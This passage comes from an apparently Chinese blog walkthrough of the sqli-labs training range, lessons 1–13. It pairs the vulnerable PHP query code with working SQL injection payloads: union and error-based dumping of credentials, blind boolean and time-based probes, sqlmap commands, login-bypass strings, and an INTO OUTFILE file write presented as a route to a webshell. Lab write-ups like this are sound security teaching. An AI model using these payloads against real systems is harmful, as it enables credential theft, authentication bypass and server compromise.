0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>数据库第一个字母为 <code>s</code></p><pre><code class="hljs sql">?id=1&#x27; and left(database(),1)&gt;&#x27;r&#x27;--+?id=1&#x27; and left(database(),1)&gt;&#x27;s&#x27;--+?id=1&#x27; and left(database(),2)&gt;&#x27;sd&#x27;--+?id=1&#x27; and left(database(),2)&gt;&#x27;se&#x27;--+...</code></pre><h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><p>利用<code>if(条件,0,1)</code>函数，当条件为真，返回0，假则返回1</p><pre><code class="hljs sql">?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+?id=1&#x27; and if(ascii(substr(database(),2,1))&gt;100,1,sleep(5))--+?id=1&#x27; and if(ascii(substr(database(),2,1))&gt;101,1,sleep(5))--+...</code></pre><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p><strong>联合查询注入</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</code></pre><p><strong>报错注入</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=E -v 3</code></pre><p><strong>布尔盲注</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</code></pre><p><strong>延时盲注</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</code></pre><h1 id="基础挑战-1-20-关"><a href="#基础挑战-1-20-关" class="headerlink" title="基础挑战 1-20 关"></a>基础挑战 1-20 关</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持联合、报错、布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出查询内容<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><h3 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre><code class="hljs sql">?id=1&#x27;?id=1&#x27; order by 3 <span class="hljs-comment">--+</span>?id=1&#x27; order by 4 <span class="hljs-comment">--+</span>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-1 利用方式一致，只是闭合方式不一样而已</p><pre><code class="hljs sql">?id=1?id=1 order by 3 <span class="hljs-comment">--+</span>?id=1 order by 4 <span class="hljs-comment">--+</span>?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-number">0x7573657273</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="hljs-subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-1 利用方式一致，只是闭合方式不一样而已。</p><pre><code class="hljs sql">?id=1&#x27;)?id=1&#x27;) order by 3 <span class="hljs-comment">--+</span>?id=1&#x27;) order by 4 <span class="hljs-comment">--+</span>?id=-1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 先双引号 在括号拼接</span><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(<span class="hljs-subst">$id</span>) LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持联合、报错、布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出查询内容<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><pre><code class="hljs sql">?id=1&quot;)?id=1&quot;) order by 3 <span class="hljs-comment">--+</span>?id=1&quot;) order by 4 <span class="hljs-comment">--+</span>?id=-1&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&quot;) union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&quot;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&quot;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 直接单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持报错、布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in...........<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致。</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 3,1),0x7e),1)--+ </span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-5 利用方式一致，只是闭合方式不一样，这里不再啰嗦了。</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 使用单引号加双层括号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="hljs-subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in.... <span class="hljs-keyword">Use</span> <span class="hljs-title">outfile</span>......<span class="hljs-title">else</span>:    输出 <span class="hljs-title">You</span> <span class="hljs-title">have</span> <span class="hljs-title">an</span> <span class="hljs-title">error</span> <span class="hljs-title">in</span> <span class="hljs-title">your</span> <span class="hljs-title">SQL</span> <span class="hljs-title">syntax</span>  //<span class="hljs-title">print_r</span>(<span class="hljs-title">mysql_error</span>());</code></pre><p>因为这里把<code>print_r(mysql_error());</code>给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。</p><p>因为这一关作者很明显地提示了如下信息：</p><pre><code class="hljs lasso">You are <span class="hljs-keyword">in</span><span class="hljs-params">...</span>. Use outfile<span class="hljs-params">...</span><span class="hljs-params">...</span></code></pre><p>所以我们就来配合一下作者，使用 outfile 导出到文件来查询数据，默认 outfile 是没有开启的，得手动开启一下</p><pre><code class="hljs Bash">mysql&gt; show global variables like <span class="hljs-string">&#x27;%secure%&#x27;</span>;+--------------------------+-------+| Variable_name            | Value |+--------------------------+-------+| require_secure_transport | OFF   || secure_file_priv         | NULL  |+--------------------------+-------+2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>, 1 warning (0.02 sec)</code></pre><ul><li>secure_file_priv的值为 <code>null</code> ，表示限制 mysqld 不允许导入|导出</li><li>当secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入|导出做限制</li></ul><p><code>在mysql.ini里添加&quot;secure_file_priv=&#39;&#39;，保存，重启mysql</code></p><p>一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：</p><pre><code class="hljs sql">?id=1&#x27;)) union <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;D:/phpstudy_pro/WWW/sqli.pl/Less-7/users.txt&quot;</span><span class="hljs-comment">--+ </span></code></pre><p>users.txt内容</p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>DumbDumb<span class="hljs-attribute">2</span>AngelinaI-kill-you<span class="hljs-attribute">3</span>Dummyp@ssword<span class="hljs-attribute">4</span>securecrappy<span class="hljs-attribute">5</span>stupidstupidity<span class="hljs-attribute">6</span>supermangenious<span class="hljs-attribute">7</span>batmanmob!le<span class="hljs-attribute">8</span>adminadmin<span class="hljs-attribute">9</span>admin<span class="hljs-number">1</span>admin<span class="hljs-number">1</span><span class="hljs-attribute">10</span>admin<span class="hljs-number">2</span>admin<span class="hljs-number">2</span><span class="hljs-attribute">11</span>admin<span class="hljs-number">3</span>admin<span class="hljs-number">3</span><span class="hljs-attribute">12</span>dhakkandumbo<span class="hljs-attribute">14</span>admin<span class="hljs-number">4</span>admin<span class="hljs-number">4</span></code></pre><p>一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高：</p><pre><code class="hljs Sql">?id=1&#x27;)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;D:/phpstudy_pro/WWW/sqli.pl/Less-7/info.php&quot;</span><span class="hljs-comment">--+ </span></code></pre><p>访问对应的 URL 看看是否解析了呢：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/01.png" alt="img"></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样</p><pre><code class="hljs mysql">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+?id&#x3D;1&#39; and left(database(),2)&gt;&#39;sd&#39;--+?id&#x3D;1&#39; and left(database(),2)&gt;&#39;se&#39;--+...</code></pre><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样</p><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 使用单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in............<span class="hljs-keyword">else</span>:    输出 You are in...........</code></pre><p>从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入.</p><pre><code class="hljs mysql">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),2,1))&gt;100,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),2,1))&gt;101,1,sleep(5))--+...</code></pre><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 先使用双引号再直接拼接</span><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>;<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in............<span class="hljs-keyword">else</span>:    输出 You are in...........</code></pre><p>和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;x&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># POST 方式接受变量</span><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<span class="hljs-comment"># 使用单引号拼接 SQL</span>@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出查询的信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。</p><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：</p><pre><code class="hljs mysql">mysql&gt; select * from users where username &#x3D; &#39;admin&#39;;+----+----------+----------+| id | username | password |+----+----------+----------+|  8 | admin    | admin    |+----+----------+----------+</code></pre><p>因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：</p><pre><code class="hljs Bash"><span class="hljs-comment"># 注释掉 passwd 来登录</span>uname=admin<span class="hljs-string">&#x27; or 1=1#&amp;passwd=&amp;submit=Submit</span><span class="hljs-string">uname=admin&#x27;</span><span class="hljs-comment">#&amp;passwd=&amp;submit=Submit</span><span class="hljs-comment"># 注释后面语句 并 添加一个永真条件</span>uname=admin&amp;passwd=1<span class="hljs-string">&#x27; or 1#&amp;submit=Submit</span><span class="hljs-string">uname=admin&amp;passwd=1&#x27;</span>||1<span class="hljs-comment">#&amp;submit=Submit</span>uname=admin&amp;passwd=1<span class="hljs-string">&#x27; or 1#&amp;submit=Submit</span><span class="hljs-string">uname=admin&amp;passwd=1&#x27;</span>||1<span class="hljs-comment">#&amp;submit=Submit</span><span class="hljs-comment"># 闭合后面语句 并 添加一个永真条件</span>uname=admin&amp;passwd=1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1&amp;submit=Submituname=admin&amp;passwd=1<span class="hljs-string">&#x27;||&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1&amp;submit=Submit</code></pre><blockquote><p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p></blockquote><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>username=(&#39;x&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong></p><pre><code class="hljs Php"><span class="hljs-comment"># POST 方式接受变量</span><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<span class="hljs-comment"># 使用单引号和括号来拼接 SQL</span>@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="hljs-subst">$uname</span>&#x27;) and password=(&#x27;<span class="hljs-subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    并没有输出啥信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" 